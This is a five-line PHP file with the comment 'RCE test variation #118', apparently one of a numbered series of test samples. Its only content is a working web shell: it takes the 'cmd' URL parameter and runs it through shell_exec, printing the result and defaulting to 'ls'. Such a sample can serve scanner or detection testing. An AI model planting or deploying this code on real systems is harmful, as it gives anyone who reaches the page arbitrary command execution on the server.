<?php
// RCE test variation #118
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>